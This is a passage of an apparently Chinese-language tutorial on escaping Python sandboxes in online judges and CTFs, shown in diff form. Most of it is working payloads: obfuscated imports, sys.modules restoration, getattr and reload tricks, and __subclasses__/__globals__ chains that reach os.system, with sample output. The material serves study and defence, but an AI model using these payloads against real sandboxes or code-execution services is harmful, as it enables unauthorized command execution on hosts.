class="token string">'encodings'</span><span class="token punctuation">,</span> <span class="token string">'problem_report'</span><span class="token punctuation">,</span> <span class="token string">'uu'</span><span class="token punctuation">,</span> <span class="token string">'_socket'</span><span class="token punctuation">,</span> <span class="token string">'enum'</span><span class="token punctuation">,</span> <span class="token string">'profile'</span><span class="token punctuation">,</span> <span class="token string">'uuid'</span><span class="token punctuation">,</span> <span class="token string">'_sqlite3'</span><span class="token punctuation">,</span> <span class="token string">'errno'</span><span class="token punctuation">,</span> <span class="token string">'pstats'</span><span class="token punctuation">,</span> <span class="token string">'venv'</span><span class="token punctuation">,</span> <span class="token string">'_sre'</span><span class="token punctuation">,</span> <span class="token string">'faulthandler'</span><span class="token punctuation">,</span> <span class="token string">'pty'</span><span class="token punctuation">,</span> <span class="token string">'wadllib'</span><span class="token punctuation">,</span> <span class="token string">'_ssl'</span><span class="token punctuation">,</span> <span class="token string">'fcntl'</span><span class="token punctuation">,</span> <span class="token string">'ptyprocess'</span><span class="token punctuation">,</span> <span class="token string">'warnings'</span><span class="token punctuation">,</span> <span class="token string">'_stat'</span><span class="token punctuation">,</span> <span class="token string">'filecmp'</span><span class="token punctuation">,</span> <span class="token string">'pwd'</span><span class="token punctuation">,</span> <span class="token string">'wave'</span><span class="token punctuation">,</span> <span class="token string">'_string'</span><span class="token punctuation">,</span> <span class="token string">'fileinput'</span><span class="token punctuation">,</span> <span class="token string">'py_compile'</span><span class="token punctuation">,</span> <span class="token string">'weakref'</span><span class="token punctuation">,</span> <span class="token string">'_strptime'</span><span class="token punctuation">,</span> <span class="token string">'fnmatch'</span><span class="token punctuation">,</span> <span class="token string">'pyatspi'</span><span class="token punctuation">,</span> <span class="token string">'webbrowser'</span><span class="token punctuation">,</span> <span class="token string">'_struct'</span><span class="token punctuation">,</span> <span class="token string">'formatter'</span><span class="token punctuation">,</span> <span class="token string">'pyclbr'</span><span class="token punctuation">,</span> <span class="token string">'wsgiref'</span><span class="token punctuation">,</span> <span class="token string">'_symtable'</span><span class="token punctuation">,</span> <span class="token string">'fractions'</span><span class="token punctuation">,</span> <span class="token string">'pydoc'</span><span class="token punctuation">,</span> <span class="token string">'xdg'</span><span class="token punctuation">,</span> <span class="token string">'_sysconfigdata_m_linux_x86_64-linux-gnu'</span><span class="token punctuation">,</span> <span class="token string">'ftplib'</span><span class="token punctuation">,</span> <span class="token string">'pydoc_data'</span><span class="token punctuation">,</span> <span class="token string">'xdrlib'</span><span class="token punctuation">,</span> <span class="token string">'_testbuffer'</span><span class="token punctuation">,</span> <span class="token string">'functools'</span><span class="token punctuation">,</span> <span class="token string">'pyexpat'</span><span class="token punctuation">,</span> <span class="token string">'xkit'</span><span class="token punctuation">,</span> <span class="token string">'_testcapi'</span><span class="token punctuation">,</span> <span class="token string">'gc'</span><span class="token punctuation">,</span> <span class="token string">'pygtkcompat'</span><span class="token punctuation">,</span> <span class="token string">'xml'</span><span class="token punctuation">,</span> <span class="token string">'_testimportmultiple'</span><span class="token punctuation">,</span> <span class="token string">'genericpath'</span><span class="token punctuation">,</span> <span class="token string">'pymacaroons'</span><span class="token punctuation">,</span> <span class="token string">'xmlrpc'</span><span class="token punctuation">,</span> <span class="token string">'_testmultiphase'</span><span class="token punctuation">,</span> <span class="token string">'getopt'</span><span class="token punctuation">,</span> <span class="token string">'pyrfc3339'</span><span class="token punctuation">,</span> <span class="token string">'xxlimited'</span><span class="token punctuation">,</span> <span class="token string">'_thread'</span><span class="token punctuation">,</span> <span class="token string">'getpass'</span><span class="token punctuation">,</span> <span class="token string">'pytz'</span><span class="token punctuation">,</span> <span class="token string">'xxsubtype'</span><span class="token punctuation">,</span> <span class="token string">'_threading_local'</span><span class="token punctuation">,</span> <span class="token string">'gettext'</span><span class="token punctuation">,</span> <span class="token string">'queue'</span><span class="token punctuation">,</span> <span class="token string">'yaml'</span><span class="token punctuation">,</span> <span class="token string">'_tracemalloc'</span><span class="token punctuation">,</span> <span class="token string">'gi'</span><span class="token punctuation">,</span> <span class="token string">'quopri'</span><span class="token punctuation">,</span> <span class="token string">'zipapp'</span><span class="token punctuation">,</span> <span class="token string">'_warnings'</span><span class="token punctuation">,</span> <span class="token string">'glob'</span><span class="token punctuation">,</span> <span class="token string">'random'</span><span class="token punctuation">,</span> <span class="token string">'zipfile'</span><span class="token punctuation">,</span> <span class="token string">'_weakref'</span><span class="token punctuation">,</span> <span class="token string">'grp'</span><span class="token punctuation">,</span> <span class="token string">'re'</span><span class="token punctuation">,</span> <span class="token string">'zipimport'</span><span class="token punctuation">,</span> <span class="token string">'_weakrefset'</span><span class="token punctuation">,</span> <span class="token string">'gtweak'</span><span class="token punctuation">,</span> <span class="token string">'readline'</span><span class="token punctuation">,</span> <span class="token string">'zlib'</span><span class="token punctuation">,</span> <span class="token string">'_yaml'</span><span class="token punctuation">,</span> <span class="token string">'gzip'</span><span class="token punctuation">,</span> <span class="token string">'reportlab'</span><span class="token punctuation">,</span> <span class="token string">'zope'</span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token string">'hashlib'</span><span class="token punctuation">,</span> <span class="token string">'reprlib'</span><span class="token punctuation">,</span> <span class="token string">'aifc'</span><span class="token punctuation">,</span> <span class="token string">'heapq'</span>
+<span class="token punctuation">]</span>
+
+methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'sys'</span><span class="token punctuation">,</span> <span class="token string">'__builtins__'</span><span class="token punctuation">]</span>
+
+results <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
+<span class="token keyword">for</span> module <span class="token keyword">in</span> all_modules_3<span class="token punctuation">:</span>
+    results<span class="token punctuation">[</span>module<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
+        <span class="token string">'flag'</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
+        <span class="token string">'result'</span><span class="token punctuation">:</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        m <span class="token operator">=</span> <span class="token builtin">__import__</span><span class="token punctuation">(</span>module<span class="token punctuation">)</span>
+        attrs <span class="token operator">=</span> <span class="token builtin">dir</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
+        <span class="token keyword">for</span> method <span class="token keyword">in</span> methods<span class="token punctuation">:</span>
+            <span class="token keyword">if</span> method <span class="token keyword">in</span> attrs<span class="token punctuation">:</span>
+                result <span class="token operator">=</span> <span class="token string">'yes'</span>
+                results<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span>
+            <span class="token keyword">else</span><span class="token punctuation">:</span>
+                result <span class="token operator">=</span> <span class="token string">'no'</span>
+
+            results<span class="token punctuation">[</span>module<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>method<span class="token punctuation">]</span> <span class="token operator">=</span> result
+
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+
+<span class="token keyword">for</span> result <span class="token keyword">in</span> results<span class="token punctuation">:</span>
+    <span class="token keyword">if</span> results<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+]'</span> <span class="token operator">+</span> result<span class="token punctuation">)</span>
+        <span class="token keyword">for</span> r <span class="token keyword">in</span> results<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'  [-]'</span> <span class="token operator">+</span> r <span class="token operator">+</span> <span class="token string">': '</span> <span class="token operator">+</span> results<span class="token punctuation">[</span>result<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span><span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span>
+</code></pre> 
+<p><code>all_modules_2</code>就是 2.x 的标准库，<code>all_modules_3</code> 就是 3.x 的标准库。</p> 
+<p>结果相当多，这里就不贴了。这里注意一下，这个文件别命名为 <code>test.py</code>，如果命名为 test 会怎么样呢？可以先猜一猜，后面会给解释。</p> 
+<p>如果 oj 支持 <code>import</code> 的话，这些库都是高危的，放任不管基本上是坐等被日。所以为了避免过滤不完善导致各种问题，在 Python 沙箱套一层 docker 肯定不会是坏事。</p> 
+<h4><a id="_import_87"></a>花式 import</h4> 
+<p>首先，禁用 <code>import os</code> 肯定是不行的，因为</p> 
+<pre><code>import  os
+import   os
+import    os
+...
+</code></pre> 
+<p>都可以。如果多个空格也过滤了，Python 能够 import 的可不止 <code>import</code>，还有 <code>__import__</code>：<code>__import__('os')</code>，<code>__import__</code>被干了还有 <code>importlib</code>：<code>importlib.import_module('os').system('ls')</code></p> 
+<p>这样就安全了吗？实际上<code>import</code>可以通过其他方式完成。回想一下 import 的原理，本质上就是执行一遍导入的库。这个过程实际上可以用 <code>execfile</code> 来代替：</p> 
+<pre><code>execfile('/usr/lib/python2.7/os.py')
+system('ls')
+</code></pre> 
+<p>不过要注意，2.x 才能用，3.x 删了 execfile，不过可以这样：</p> 
+<pre><code>with open('/usr/lib/python3.6/os.py','r') as f:
+    exec(f.read())
+
+system('ls')
+</code></pre> 
+<p>这个方法倒是 2.x、3.x 通用的。</p> 
+<p>不过要使用上面的这两种方法，就必须知道库的路径。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下，：</p> 
+<pre><code>import sys
+print(sys.path)
+</code></pre> 
+<h4><a id="_134"></a>花式处理字符串</h4> 
+<p>代码中要是出现 <code>os</code>，直接不让运行。那么可以利用字符串的各种变化来引入 os：</p> 
+<pre><code>__import__('so'[::-1]).system('ls')
+</code></pre> 
+<pre><code>b = 'o'
+a = 's'
+__import__(a+b).system('ls')
+</code></pre> 
+<p>还可以利用 <code>eval</code> 或者 <code>exec</code>：</p> 
+<pre><code>&gt;&gt;&gt; eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])
+macr0phag3
+0
+&gt;&gt;&gt; exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
+macr0phag3
+</code></pre> 
+<p>eval、exec 都是相当危险的函数，exec 比 eval 还要危险，它们一定要过滤，因为字符串有很多变形的方式，对字符串的处理可以有：逆序、拼接、base64、hex、rot13…等等，太多了。。。</p> 
+<pre><code>['__builtins__'] == 
+['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'] == #hex
+[u'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f'] == #Unicode
+['X19idWlsdGluc19f'.decode('base64')] == #base64
+['__buil'+'tins__'] == #+拼接
+['__buil''tins__'] == 
+["_builtins_".join("__")] == 
+['%c%c%c%c%c%c%c%c%c%c%c%c' % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]#chr
+...
+</code></pre> 
+<p>你看看最后那个格式化字符串，这不是直接起飞？啥字符构造不了？</p> 
+<p>上面提到了字符串过滤绕过，顺便说一下，如果是过滤了数字（虽然这种情况很少见），那绕过的方式就更多了，我这里随便列下：<br> \1. 0：<code>int(bool([]))</code>、<code>Flase</code>、<code>len([])</code><br> \2. 1：<code>int(bool([""]))</code>、<code>True</code><br> \3. 获取稍微大的数字：<code>len(str({}.keys))</code>，不过需要慢慢找长度符合的字符串<br> \4. 1.0：<code>float(True)</code></p> 
+<p>其实有了 <code>0</code> 就可以了，要啥整数直接做运算即可：</p> 
+<pre><code>0 ** 0 == 1
+1 + 1 == 2
+2 + 1 == 3
+2 ** 2 == 4
+...
+</code></pre> 
+<p>任意浮点数稍微麻烦点，需要想办法运算，但是一定可以搞出来，除非是 π 这种玩意…</p> 
+<h4><a id="_sysmodules_198"></a>恢复 sys.modules</h4> 
+<p><code>sys.modules</code> 是一个字典，里面储存了加载过的模块信息。如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。有些库例如 <code>os</code> 是默认被加载进来的，但是不能直接使用（但是可以通过 <code>sys.modules</code> 来使用，例如 <code>sys.modules["os"]</code>），原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。</p> 
+<p>如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：</p> 
+<pre><code>&gt;&gt;&gt; sys.modules['os'] = 'not allowed'
+&gt;&gt;&gt; import os
+&gt;&gt;&gt; os.system('ls')
+Traceback (most recent call last):
+  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
+AttributeError: 'str' object has no attribute 'system'
+</code></pre> 
+<p>注意，这里不能用 <code>del sys.modules['os']</code>，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。</p> 
+<p>所以删了 <code>sys.modules['os']</code> 只会让 Python 重新加载一次 os。</p> 
+<p>看到这你肯定发现了，对于上面的过滤方式，绕过的方式可以是这样：</p> 
+<pre><code>sys.modules['os'] = 'not allowed' # oj 为你加的
+
+del sys.modules['os']
+import os
+os.system('ls')
+</code></pre> 
+<p>最后还有一种利用 <code>__builtins__</code> 导入的方式，下面会详细说。</p> 
+<h4><a id="_233"></a>花式执行函数</h4> 
+<p>通过上面内容我们很容易发现，光引入 os 只不过是第一步，如果把 system 这个函数干掉，也没法通过<code>os.system</code>执行系统命令，并且这里的<code>system</code>也不是字符串，也没法直接做编码等等操作。我遇到过一个环境，直接在<code>/usr/lib/python2.7/os.py</code>中删了<code>system</code>函数。。。</p> 
+<p>不过，要明确的是，os 中能够执行系统命令的函数有很多：</p> 
+<pre><code>print(os.system('whoami'))
+print(os.popen('whoami').read()) 
+print(os.popen2('whoami').read()) # 2.x
+print(os.popen3('whoami').read()) # 2.x
+print(os.popen4('whoami').read()) # 2.x
+...
+</code></pre> 
+<p>应该还有一些，可以在这里找找：<br> <a href="https://docs.python.org/2/library/os.html" rel="nofollow">2.x 传送门🚪</a><br> <a href="https://docs.python.org/3/library/os.html" rel="nofollow">3.x 传送门🚪</a><br> 过滤<code>system</code>的时候说不定还有其他函数给漏了。</p> 
+<p>其次，可以通过 <code>getattr</code> 拿到对象的方法、属性：</p> 
+<pre><code>import os
+getattr(os, 'metsys'[::-1])('whoami')
+Copy
+</code></pre> 
+<p>不让出现 import也没事：</p> 
+<pre><code>&gt;&gt;&gt; getattr(getattr(__builtins__, '__tropmi__'[::-1])('so'[::-1]), 'metsys'[::-1])('whoami')
+macr0phag3
+0
+</code></pre> 
+<p>一样可以。这个方法同样可以用于逃逸过滤 import 的沙箱。关于 <code>__builtins__</code>，见下文。</p> 
+<p>与 <code>getattr</code> 相似的还有 <code>__getattr__</code>、<code>__getattribute__</code>，它们自己的区别就是<code>getattr</code>相当于<code>class.attr</code>，都是获取类属性/方法的一种方式，在获取的时候会触发<code>__getattribute__</code>，如果<code>__getattribute__</code>找不到，则触发<code>__getattr__</code>，还找不到则报错。更具体的这里就不解释了，有兴趣的话可以搜搜。</p> 
+<h4><a id="builtins__builtin____builtins___279"></a>builtins、<strong>builtin__与__builtins</strong></h4> 
+<p>先说一下，<code>builtin</code>、<code>builtins</code>，<code>__builtin__</code>与<code>__builtins__</code>的区别：<br> 首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。顺便说一下，Python 对函数、变量、类等等的查找方式是按 <code>LEGB</code> 规则来找的，其中 B 即代表内建模块，这里也不再赘述了，有兴趣的搜搜就明白了。</p> 
+<p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：<br> 2.x：</p> 
+<pre><code>&gt;&gt;&gt; import __builtin__
+&gt;&gt;&gt; __builtin__
+&lt;module '__builtin__' (built-in)&gt;
+</code></pre> 
+<p>3.x：</p> 
+<pre><code>&gt;&gt;&gt; import builtins
+&gt;&gt;&gt; builtins
+&lt;module 'builtins' (built-in)&gt;
+</code></pre> 
+<p>但是，<code>__builtins__</code> 两者都有，实际上是<code>__builtin__</code>和<code>builtins</code> 的引用。它不需要导入，我估计是为了统一 2.x 和 3.x。不过<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>是有一点区别的，感兴趣的话建议查一下，这里就不啰嗦了。不管怎么样，<code>__builtins__</code> 相对实用一点，并且在 <code>__builtins__</code>里有很多好东西：</p> 
+<pre><code>&gt;&gt;&gt; '__import__' in dir(__builtins__)
+True
+&gt;&gt;&gt; __builtins__.__dict__['__import__']('os').system('whoami')
+macr0phag3
+0
+&gt;&gt;&gt; 'eval' in dir(__builtins__)
+True
+&gt;&gt;&gt; 'execfile' in dir(__builtins__)
+True
+</code></pre> 
+<p>那么既然<code>__builtins__</code>有这么多危险的函数，不如将里面的危险函数破坏了：</p> 
+<pre><code>__builtins__.__dict__['eval'] = 'not allowed'
+</code></pre> 
+<p>或者直接删了：</p> 
+<pre><code>del __builtins__.__dict__['eval']
+</code></pre> 
+<p>但是我们可以利用 <code>reload(__builtins__)</code> 来恢复 <code>__builtins__</code>。不过，我们在使用 <code>reload</code> 的时候也没导入，说明<code>reload</code>也在 <code>__builtins__</code>里，那如果连<code>reload</code>都从<code>__builtins__</code>中删了，就没法恢复<code>__builtins__</code>了，需要另寻他法。还有一种情况是利用 <code>exec command in _global</code> 动态运行语句时的绕过，比如实现一个计算器的时候，在最后有给出例子。</p> 
+<p>这里注意，2.x 的 <code>reload</code> 是内建的，3.x 需要 <code>import imp</code>，然后再 <code>imp.reload</code>。你看，reload 的参数是 <code>module</code>，所以肯定还能用于重新载入其他模块，这个放在下面说。</p> 
+<h4><a id="_341"></a>通过继承关系逃逸</h4> 
+<p>在 Python 中提到继承就不得不提 <code>mro</code>，<code>mro</code>就是方法解析顺序，因为 Python 支持多重继承，所以就必须有个方式判断某个方法到底是 A 的还是 B 的。2.2 之前是经典类，搜索是深度优先；经典类后来发展为新式类，使用广度优先搜索，再后来新式类的搜索变为 C3 算法；而 3.x 中新式类一统江湖，默认继承 <code>object</code>，当然也是使用的 C3 搜索算法。。。扯远了扯远了，感兴趣的可以搜搜。不管怎么说，总是让人去判断继承关系显然是反人类的，所以 Python 中新式类都有个属性，<code>.__mro__</code> 或 <code>.mro()</code>，是个元组，记录了继承关系：</p> 
+<pre><code>&gt;&gt;&gt; ''.__class__.__mro__
+(&lt;class 'str'&gt;, &lt;class 'object'&gt;)
+</code></pre> 
+<p>类的实例在获取 <code>__class__</code> 属性时会指向该实例对应的类。可以看到，<code>''</code>属于 <code>str</code>类，它继承了 <code>object</code> 类，这个类是所有类的超类。具有相同功能的还有<code>__base__</code>和<code>__bases__</code>。需要注意的是，经典类需要指明继承 object 才会继承它，否则是不会继承的：</p> 
+<pre><code>&gt;&gt;&gt; class test:
+...     pass
+...
+&gt;&gt;&gt; test.__bases__
+()
+&gt;&gt;&gt; class test(object):
+...     pass
+...
+&gt;&gt;&gt; test.__bases__
+(&lt;type 'object'&gt;,)
+</code></pre> 
+<p>那么知道这个有什么用呢？</p> 
+<p>由于没法直接引入 os，那么假如有个库叫<code>oos</code>，在<code>oos</code>中引入了<code>os</code>，那么我们就可以通过<code>__globals__</code>拿到 os。例如，<code>site</code> 这个库就有 <code>os</code>：</p> 
+<pre><code>&gt;&gt;&gt; import site
+&gt;&gt;&gt; site.os
+&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py'&gt;
+</code></pre> 
+<p>怎么理解这个 <code>__globals__</code> 呢？它是函数所在的全局命名空间中所定义的全局变量。也就是只要是函数就会有这个属性。除了 <code>builtin_function_or_method</code> 或者是 <code>wrapper_descriptor</code> 、<code>method-wrapper</code> 类型的函数，例如 <code>range</code>、<code>range.__init__</code>、<code>''.split</code> 等等。</p> 
+<p>那么也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 <code>import site</code>。可以利用 <code>reload</code>，变相加载 <code>os</code>：</p> 
+<pre><code>&gt;&gt;&gt; import site
+&gt;&gt;&gt; os
+Traceback (most recent call last):
+  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
+NameError: name 'os' is not defined
+&gt;&gt;&gt; os = reload(site.os)
+&gt;&gt;&gt; os.system('whoami')
+macr0phag3
+0
+</code></pre> 
+<p>还有，既然所有的类都继承的<code>object</code>，那么我们先用<code>__subclasses__</code>看看它的子类，以 2.x 为例：</p> 
+<pre><code>&gt;&gt;&gt; for i in enumerate(''.__class__.__mro__[-1].__subclasses__()): print i
+...
+(0, &lt;type 'type'&gt;)
+(1, &lt;type 'weakref'&gt;)
+(2, &lt;type 'weakcallableproxy'&gt;)
+(3, &lt;type 'weakproxy'&gt;)
+(4, &lt;type 'int'&gt;)
+(5, &lt;type 'basestring'&gt;)
+(6, &lt;type 'bytearray'&gt;)
+(7, &lt;type 'list'&gt;)
+(8, &lt;type 'NoneType'&gt;)
+(9, &lt;type 'NotImplementedType'&gt;)
+(10, &lt;type 'traceback'&gt;)
+(11, &lt;type 'super'&gt;)
+(12, &lt;type 'xrange'&gt;)
+(13, &lt;type 'dict'&gt;)
+(14, &lt;type 'set'&gt;)
+(15, &lt;type 'slice'&gt;)
+(16, &lt;type 'staticmethod'&gt;)
+(17, &lt;type 'complex'&gt;)
+(18, &lt;type 'float'&gt;)
+(19, &lt;type 'buffer'&gt;)
+(20, &lt;type 'long'&gt;)
+(21, &lt;type 'frozenset'&gt;)
+(22, &lt;type 'property'&gt;)
+(23, &lt;type 'memoryview'&gt;)
+(24, &lt;type 'tuple'&gt;)
+(25, &lt;type 'enumerate'&gt;)
+(26, &lt;type 'reversed'&gt;)
+(27, &lt;type 'code'&gt;)
+(28, &lt;type 'frame'&gt;)
+(29, &lt;type 'builtin_function_or_method'&gt;)
+(30, &lt;type 'instancemethod'&gt;)
+(31, &lt;type 'function'&gt;)
+(32, &lt;type 'classobj'&gt;)
+(33, &lt;type 'dictproxy'&gt;)
+(34, &lt;type 'generator'&gt;)
+(35, &lt;type 'getset_descriptor'&gt;)
+(36, &lt;type 'wrapper_descriptor'&gt;)
+(37, &lt;type 'instance'&gt;)
+(38, &lt;type 'ellipsis'&gt;)
+(39, &lt;type 'member_descriptor'&gt;)
+(40, &lt;type 'file'&gt;)
+(41, &lt;type 'PyCapsule'&gt;)
+(42, &lt;type 'cell'&gt;)
+(43, &lt;type 'callable-iterator'&gt;)
+(44, &lt;type 'iterator'&gt;)
+(45, &lt;type 'sys.long_info'&gt;)
+(46, &lt;type 'sys.float_info'&gt;)
+(47, &lt;type 'EncodingMap'&gt;)
+(48, &lt;type 'fieldnameiterator'&gt;)
+(49, &lt;type 'formatteriterator'&gt;)
+(50, &lt;type 'sys.version_info'&gt;)
+(51, &lt;type 'sys.flags'&gt;)
+(52, &lt;type 'exceptions.BaseException'&gt;)
+(53, &lt;type 'module'&gt;)
+(54, &lt;type 'imp.NullImporter'&gt;)
+(55, &lt;type 'zipimport.zipimporter'&gt;)
+(56, &lt;type 'posix.stat_result'&gt;)
+(57, &lt;type 'posix.statvfs_result'&gt;)
+(58, &lt;class 'warnings.WarningMessage'&gt;)
+(59, &lt;class 'warnings.catch_warnings'&gt;)
+(60, &lt;class '_weakrefset._IterationGuard'&gt;)
+(61, &lt;class '_weakrefset.WeakSet'&gt;)
+(62, &lt;class '_abcoll.Hashable'&gt;)
+(63, &lt;type 'classmethod'&gt;)
+(64, &lt;class '_abcoll.Iterable'&gt;)
+(65, &lt;class '_abcoll.Sized'&gt;)
+(66, &lt;class '_abcoll.Container'&gt;)
+(67, &lt;class '_abcoll.Callable'&gt;)
+(68, &lt;type 'dict_keys'&gt;)
+(69, &lt;type 'dict_items'&gt;)
+(70, &lt;type 'dict_values'&gt;)
+(71, &lt;class 'site._Printer'&gt;)
+(72, &lt;class 'site._Helper'&gt;)
+(73, &lt;type '_sre.SRE_Pattern'&gt;)
+(74, &lt;type '_sre.SRE_Match'&gt;)
+(75, &lt;type '_sre.SRE_Scanner'&gt;)
+(76, &lt;class 'site.Quitter'&gt;)
+(77, &lt;class 'codecs.IncrementalEncoder'&gt;)
+(78, &lt;class 'codecs.IncrementalDecoder'&gt;)
+</code></pre> 
+<p>可以看到，site 就在里面，以 2.x 的<code>site._Printer</code>为例（py3.x 中已经移除了这里 <code>__globals__</code> 的 <code>os</code>）：</p> 
+<pre><code>&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__['os']
+&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;
+
+&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：
+&gt;&gt;&gt; [i._Printer__setup.__globals__['os'] for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_Printer"]
+&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;
+</code></pre> 
+<p>os 又回来了。并且 site 中还有 <code>__builtins__</code>。</p> 
+<p>这个方法不仅限于 A-&gt;os，还阔以是 A-&gt;B-&gt;os，比如 2.x 中的 <code>warnings</code>：</p> 
+<pre><code>&gt;&gt;&gt; import warnings
+&gt;&gt;&gt; 
+&gt;&gt;&gt; warnings.os
+Traceback (most recent call last):
+  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
+AttributeError: 'module' object has no attribute 'os'
+&gt;&gt;&gt; 
+&gt;&gt;&gt; warnings.linecache
+&lt;module 'linecache' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc'&gt;
+&gt;&gt;&gt;
+&gt;&gt;&gt; warnings.linecache.os
+&lt;module 'os' from '/Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc'&gt;
+</code></pre> 
+<p>在继承链中就可以这样（py3.x 中已经移除了这里 <code>__globals__</code> 的 <code>linecache</code>）：</p> 
+<pre><code>&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('whoami')
+macr0phag3
+0
+&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：
+&gt;&gt;&gt; [i.__init__.__globals__['linecache'].__dict__['os'].system('whoami') for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "catch_warnings"]
+</code></pre> 
+<p>顺便说一下，<code>warnings</code>这个库中有个函数：<code>warnings.catch_warnings</code>，它有个<code>_module</code>属性：</p> 
+<pre><code>    def __init__(self, record=False, module=None):
+...
+        self._module = sys.modules['warnings'] if module is None else module
+...
+</code></pre> 
+<p>所以通过<code>_module</code>也可以构造 payload（py3.x 中已经移除了 <code>catch_warnings</code> 的 <code>linecache</code>）：</p> 
+<pre><code>&gt;&gt;&gt; [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.linecache.os.system('whoami')
+macr0phag3
+0
+</code></pre> 
+<p>3.x 中的<code>warnings</code>虽然没有 <code>linecache</code>，也有<code>__builtins__</code>。</p> 
+<p>同样，py3.x 中有<code>&lt;class 'os._wrap_close'&gt;</code>，利用方式可以为：</p> 
+<pre><code>&gt;&gt;&gt; ''.__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__['system']('whoami')
+macr0phag3
+0
+&gt;&gt;&gt; # 为了避免 index 位置问题，可以这样写：
+&gt;&gt;&gt; [i for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "_wrap_close"][0].__init__.__globals__['system']('whoami')
+Copy
+</code></pre> 
+<p>当然这样也是可以的（3.x）：</p> 
+<pre><code>set.mro()[-1].__subclasses__()[133].__init__.__globals__['system']('whoami')
+</code></pre> 
+<p>顺便提一下，<code>object</code> 本来就是可以使用的，如果没过滤的话，payload 可以再简化为：</p> 
+<pre><code>object.__subclasses__()[133].__init__.__globals__['system']('whoami')
+</code></pre> 
+<p>还有一种是利用<code>builtin_function_or_method</code> 的 <code>__call__</code>：</p> 
+<pre><code>"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval, '1+1')
+</code></pre> 
+<p>或者简单一点：</p> 
+<pre><code>[].pop.__class__.__call__(eval, '1+1')
+</code></pre> 
+<p>上面这些 payload 大多数是直接 index 了，但是直接用 index 不太健壮，可以都换成列表推导式，用 <code>__name__</code> 来获取想要的 class，上面也举了好几个例子了，这里就不多说啦。</p> 
+<p>最后再补充几个。</p> 
+<p>可以这样利用：</p> 
+<pre><code>class test(dict):
+    def __init__(self):
+        print(super(test, self).keys.__class__.__call__(eval, '1+1'))
+        # 如果是 3.x 的话可以简写为：
+        # super().keys.__class__.__call__(eval, '1+1'))
+test()
+</code></pre> 
+<p>还可以利用异常逃逸：</p> 
+<pre><code>hack = lambda : [0][1]
+try:
+    hack()
+except Exception as e:
+    e.__traceback__.tb_next.tb_frame.f_globals['__builtins__']['__import__']('os').system('whoami')
+</code></pre> 
+<p>还可以利用 <code>format</code>：<br> \1. <code>"{0.__class__.__base__}".format([])</code><br> \1. <code>"{x.__class__.__base__}".format(x=[])</code><br> \1. <code>"{.__class__.__base__}".format([])</code><br> \1. <code>("{0.__class_"+"_.__base__}").format([])</code></p> 
